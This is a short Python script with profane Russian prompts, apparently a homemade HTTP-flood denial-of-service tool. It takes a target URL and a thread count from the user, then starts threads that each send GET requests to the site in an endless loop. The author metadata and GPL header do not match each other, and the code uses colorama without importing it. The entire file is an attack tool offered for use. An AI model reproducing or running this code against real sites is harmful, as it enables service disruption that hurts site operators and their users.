#!/usr/bin/python
#coding=utf-8

__AUTHOR__	= "CAMEL"
__DATE__	= "16/01/20"
__VERSION__	= "0.1"
__GITHUB__	= "https://github.com/unknown"

'''Agradecimento especial ao Maximoz e BernardoGO'''

"""
    Copyright (C) 2015  Franco Colombino
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""


import threading
import requests

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Хуйню отослал!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Ошибка соединения!")
threads = 20

url = input("ДАВАЙ САЙТ СЮДА: ")

try:
    threads = int(input("Количество ПОТОКОВ БЛТЬ: "))
except ValueError:
    exit("Ебучее кол-во потоков неправильное!")

if threads == 0:
    exit("тоже, нихуя не верные потоки, пробуй еще!")

if not url.__contains__("http"):
    exit("а, кароч, ссылка не http или https формат!")

if not url.__contains__("."):
    exit("хУЁВЫй домеН")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " ПОТОКИ ХУЯРЯТСЯ, МОЛОДЕЦ!")

    
